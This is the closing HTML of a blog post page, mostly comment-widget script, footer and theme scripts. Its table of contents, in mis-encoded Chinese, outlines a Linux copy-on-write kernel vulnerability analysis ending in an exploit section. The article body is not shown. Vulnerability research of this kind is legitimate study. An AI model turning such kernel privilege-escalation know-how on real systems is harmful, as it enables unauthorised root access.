<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="valine-container">
        <div id="vcomments"></div>
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        ></script>
        <script 
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        >
          window.KeepCommentPlugin.initValine = () => {
            const config = {
              el: '#vcomments',
              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
              appKey: 'C672AAYGXMkHxztf8ntdLShs',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®ºï¼ˆç•™ä¸‹é‚®ç®±æœ‰é€šçŸ¥å“¦ï½ï¼‰',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('') {
              config.serverURLs = ''
            }

            if (window?.Valine) {
              new Valine(config)
              window.KeepCommentPlugin.hideLoading()
            } else {
              setTimeout(() => {
                window.KeepCommentPlugin.initValine()
              }, 1000)
            }
          }

          if ('false' === 'true') {
            setTimeout(() => {
              window.KeepCommentPlugin.initValine()
            }, 1200)
          } else {
            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
          }
        </script>
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#COW%E6%9C%BA%E5%88%B6"><span class="nav-text">COWæœºåˆ¶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#basic-COW"><span class="nav-text">basic COW</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mmap-%E4%B8%8E-COW"><span class="nav-text">mmap ä¸ COW</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8-write"><span class="nav-text">ç¼ºé¡µå¼‚å¸¸&amp;write</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E7%B1%BB"><span class="nav-text">åˆ†ç±»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%84%E7%90%86%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8"><span class="nav-text">å¤„ç†ç¼ºé¡µå¼‚å¸¸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#do-page-fault"><span class="nav-text">__do_page_fault</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#handle-mm-fault"><span class="nav-text">handle_mm_fault</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#handle-pte-fault"><span class="nav-text">handle_pte_fault</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#write%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">writeå‡½æ•°åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mem-rw"><span class="nav-text">mem_rw</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#access-remote-vm"><span class="nav-text">access_remote_vm</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#get-user-pages"><span class="nav-text">__get_user_pages</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">æ¼æ´åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-text">æ¼æ´æˆå› </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">åˆ©ç”¨åˆ†æ</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%8F%AF%E5%BE%97exp"><span class="nav-text">ç»¼ä¸Šï¼Œå¯å¾—exp</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
        
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
        
    </div>

    <div class="theme-info info-item">
        ç”±&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;é©±åŠ¨&nbsp;&&nbsp;ä¸»é¢˜&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    
        
        <div class="deploy-info info-item">
            
            æœ¬ç«™ç”± <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> æä¾›éƒ¨ç½²æœåŠ¡
            
        </div>
    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">æ€»å­—æ•°</span>
                    <span class="item-value border-box word">345.9k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">è®¿å®¢æ•°</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-item border-box pv">
                    <span class="item-type border-box">è®¿é—®é‡</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#COW%E6%9C%BA%E5%88%B6"><span class="nav-text">COWæœºåˆ¶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#basic-COW"><span class="nav-text">basic COW</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mmap-%E4%B8%8E-COW"><span class="nav-text">mmap ä¸ COW</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8-write"><span class="nav-text">ç¼ºé¡µå¼‚å¸¸&amp;write</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E7%B1%BB"><span class="nav-text">åˆ†ç±»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%84%E7%90%86%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8"><span class="nav-text">å¤„ç†ç¼ºé¡µå¼‚å¸¸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#do-page-fault"><span class="nav-text">__do_page_fault</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#handle-mm-fault"><span class="nav-text">handle_mm_fault</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#handle-pte-fault"><span class="nav-text">handle_pte_fault</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#write%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">writeå‡½æ•°åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mem-rw"><span class="nav-text">mem_rw</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#access-remote-vm"><span class="nav-text">access_remote_vm</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#get-user-pages"><span class="nav-text">__get_user_pages</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">æ¼æ´åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-text">æ¼æ´æˆå› </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">åˆ©ç”¨åˆ†æ</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%8F%AF%E5%BE%97exp"><span class="nav-text">ç»¼ä¸Šï¼Œå¯å¾—exp</span></a></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>

<!-- local search -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>


<!-- lazyload -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>

        <!-- toc -->
        
            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
